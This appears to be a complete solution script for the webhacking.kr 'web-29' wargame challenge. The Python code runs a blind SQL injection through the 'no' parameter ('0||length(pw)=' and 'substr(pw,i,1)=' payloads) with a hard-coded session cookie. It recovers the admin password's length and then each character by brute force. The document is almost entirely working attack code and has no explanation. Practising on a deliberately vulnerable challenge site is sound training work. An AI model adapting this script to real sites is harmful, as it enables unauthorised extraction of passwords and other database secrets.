from requests import *
cookies={'PHPSESSID':'o9km7fvf6vbfjun8sugn7os19e'}
key='admin password : '
leng=0
for i in range(20):
    url=f'https://webhacking.kr/challenge/web-29/?no=0||length(pw)={i}&id=guest&pw=guest'
    response=get(url=url,cookies=cookies)
    t=response.text
    if t.find(key) != -1 :
        leng=i
        print('pw length: ',i)
for i in range(1,leng+1):
    for j in range(91,128):
        k=hex(j)
        url=f'https://webhacking.kr/challenge/web-29/?no=0||substr(pw,{i},1)={k}&id=guest&pw=guest'
        response=get(url=url,cookies=cookies)
        t=response.text
        if t.find(key) != -1:
            print(i,"= ",chr(j))
            break
print('\n')
